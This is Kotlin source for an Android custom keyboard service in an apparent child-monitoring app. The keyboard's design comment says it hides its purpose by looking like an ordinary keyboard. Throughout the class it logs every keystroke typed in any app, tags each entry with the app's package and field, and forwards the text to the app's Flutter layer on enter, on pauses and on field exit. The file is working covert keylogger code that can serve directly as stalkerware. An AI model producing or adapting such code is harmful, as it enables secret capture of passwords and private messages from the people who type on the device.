package com.kova.child

import android.inputmethodservice.InputMethodService
import android.os.Handler
import android.os.Looper
import android.text.TextUtils
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import android.view.inputmethod.InputConnection
import android.widget.LinearLayout
import android.widget.Button
import android.graphics.Color
import android.graphics.Typeface
import android.view.Gravity

/**
 * MODULE 2 — KovaInputMethodService
 *
 * Custom Android Input Method Editor (IME).
 * When the KOVA keyboard is set as the active keyboard
 * it captures every keystroke the child types across ALL apps.
 *
 * Sends the text buffer to Flutter:
 *  - Every time the user presses send/enter
 *  - After 3 seconds of inactivity (typing pause)
 *
 * The keyboard renders a simple QWERTY layout
 * that looks like a normal Android keyboard.
 * Nothing suspicious or identifiable visually.
 *
 * Direction = "outgoing" for all captured text.
 */
class KovaInputMethodService : InputMethodService() {

    companion object {
        private const val TAG = "KovaInputMethodService"
        private const val FLUSH_DELAY_MS = 3000L    // 3-second pause
        private const val MIN_BUFFER_LEN = 3        // Ignore trivially short buffers
        private const val PREFS_NAME = "com.example.kova"
    }

    // ── Buffer state ──
    private val buffer = StringBuilder()
    private var currentApp = ""
    private var currentConversationId = ""

    // ── Timer for auto-flush on pause ──
    private val handler = Handler(Looper.getMainLooper())
    private val flushRunnable = Runnable { flushBuffer("pause") }

    // ── Keyboard rows ──
    private val row1 = "qwertyuiop".toList()
    private val row2 = "asdfghjkl".toList()
    private val row3 = "zxcvbnm".toList()

    private var isShifted = false

    // ─────────────────────────────────────────────
    // Lifecycle
    // ─────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ KOVA InputMethodService created")
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(flushRunnable)
        flushBuffer("destroy")
        Log.d(TAG, "❌ KOVA InputMethodService destroyed")
    }

    // ─────────────────────────────────────────────
    // Keyboard UI — standard QWERTY layout
    // ─────────────────────────────────────────────

    override fun onCreateInputView(): View {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#263238"))
            setPadding(4, 8, 4, 8)
        }

        // Row 1: q-w-e-r-t-y-u-i-o-p
        root.addView(buildKeyRow(row1))

        // Row 2: a-s-d-f-g-h-j-k-l
        root.addView(buildKeyRow(row2))

        // Row 3: SHIFT z-x-c-v-b-n-m BACKSPACE
        val row3Layout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 2, 0, 2)
        }
        row3Layout.addView(buildSpecialKey("⇧", 1.5f) { toggleShift() })
        for (c in row3) {
            row3Layout.addView(buildCharKey(c))
        }
        row3Layout.addView(buildSpecialKey("⌫", 1.5f) { handleBackspace() })
        root.addView(row3Layout)

        // Row 4: ?123  SPACE  .  ENTER
        val row4Layout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 2, 0, 2)
        }
        row4Layout.addView(buildSpecialKey("?123", 1.5f) { /* number layer — stub */ })
        row4Layout.addView(buildSpecialKey("  ", 5f) { commitChar(' ') })  // space
        row4Layout.addView(buildSpecialKey(".", 1f) { commitChar('.') })
        row4Layout.addView(buildSpecialKey("↵", 2f) { handleEnter() })
        root.addView(row4Layout)

        return root
    }

    private fun buildKeyRow(chars: List<Char>): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 2, 0, 2)
        }
        for (c in chars) {
            row.addView(buildCharKey(c))
        }
        return row
    }

    private fun buildCharKey(c: Char): View {
        val btn = Button(this).apply {
            text = c.uppercase()
            setTextColor(Color.WHITE)
            textSize = 18f
            typeface = Typeface.DEFAULT_BOLD
            setBackgroundColor(Color.parseColor("#37474F"))
            isAllCaps = false
            setPadding(0, 16, 0, 16)
            val params = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            params.setMargins(2, 2, 2, 2)
            layoutParams = params
            setOnClickListener {
                val ch = if (isShifted) c.uppercaseChar() else c
                commitChar(ch)
                if (isShifted) { isShifted = false }
            }
        }
        return btn
    }

    private fun buildSpecialKey(label: String, weight: Float, action: () -> Unit): View {
        val btn = Button(this).apply {
            text = label
            setTextColor(Color.WHITE)
            textSize = 14f
            setBackgroundColor(Color.parseColor("#455A64"))
            isAllCaps = false
            setPadding(8, 16, 8, 16)
            val params = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, weight)
            params.setMargins(2, 2, 2, 2)
            layoutParams = params
            setOnClickListener { action() }
        }
        return btn
    }

    // ─────────────────────────────────────────────
    // Input handling
    // ─────────────────────────────────────────────

    private fun commitChar(c: Char) {
        currentConnection()?.commitText(c.toString(), 1)
        buffer.append(c)
        resetFlushTimer()
    }

    private fun handleBackspace() {
        val ic = currentConnection() ?: return
        val selected = ic.getSelectedText(0)
        if (TextUtils.isEmpty(selected)) {
            ic.deleteSurroundingText(1, 0)
        } else {
            ic.commitText("", 1)
        }
        // Remove last char from buffer if possible
        if (buffer.isNotEmpty()) {
            buffer.deleteCharAt(buffer.length - 1)
        }
        resetFlushTimer()
    }

    private fun handleEnter() {
        currentConnection()?.performEditorAction(EditorInfo.IME_ACTION_DONE)
        flushBuffer("enter")
    }

    private fun toggleShift() {
        isShifted = !isShifted
    }

    private fun currentConnection(): InputConnection? = currentInputConnection

    // ─────────────────────────────────────────────
    // Editor focus — track which app the child is in
    // ─────────────────────────────────────────────

    override fun onStartInput(attribute: EditorInfo?, restarting: Boolean) {
        super.onStartInput(attribute, restarting)
        // Detect the currently focused app
        currentApp = attribute?.packageName ?: ""
        currentConversationId = "${currentApp}_${attribute?.fieldId ?: 0}"
        Log.d(TAG, "📝 Input started in: $currentApp")
    }

    override fun onFinishInput() {
        super.onFinishInput()
        // User left the input field — flush any pending text
        flushBuffer("field_exit")
    }

    // ─────────────────────────────────────────────
    // Hardware key fallback (physical keyboards)
    // ─────────────────────────────────────────────

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (event == null) return super.onKeyDown(keyCode, event)

        when (keyCode) {
            KeyEvent.KEYCODE_ENTER -> {
                flushBuffer("enter")
                return super.onKeyDown(keyCode, event)
            }
            KeyEvent.KEYCODE_DEL -> {
                if (buffer.isNotEmpty()) buffer.deleteCharAt(buffer.length - 1)
                resetFlushTimer()
                return super.onKeyDown(keyCode, event)
            }
            else -> {
                val char = event.unicodeChar
                if (char != 0) {
                    buffer.append(char.toChar())
                    resetFlushTimer()
                }
                return super.onKeyDown(keyCode, event)
            }
        }
    }

    // ─────────────────────────────────────────────
    // Buffer management
    // ─────────────────────────────────────────────

    /**
     * Reset the 3-second auto-flush timer.
     * Called after each keystroke.
     */
    private fun resetFlushTimer() {
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, FLUSH_DELAY_MS)
    }

    /**
     * Flush the buffer to Flutter.
     * Only sends if buffer length ≥ MIN_BUFFER_LEN.
     *
     * @param trigger Why the flush happened: "enter", "pause", "field_exit", "destroy"
     */
    private fun flushBuffer(trigger: String) {
        handler.removeCallbacks(flushRunnable)

        val text = buffer.toString().trim()
        if (text.length < MIN_BUFFER_LEN) {
            buffer.clear()
            return
        }

        Log.d(TAG, "📤 Flush [$trigger] app=$currentApp len=${text.length}")

        val payload = mapOf(
            "app"             to currentApp,
            "text"            to text,
            "direction"       to "outgoing",
            "source"          to "keyboard",
            "trigger"         to trigger,
            "conversationId"  to currentConversationId,
            "timestamp"       to System.currentTimeMillis(),
            "childId"         to getChildId(),
        )

        KovaChannelManager.send("keyboard", payload)
        buffer.clear()
    }

    private fun getChildId(): String {
        return try {
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            prefs.getString("child_id", "unknown") ?: "unknown"
        } catch (_: Exception) {
            "unknown"
        }
    }
}
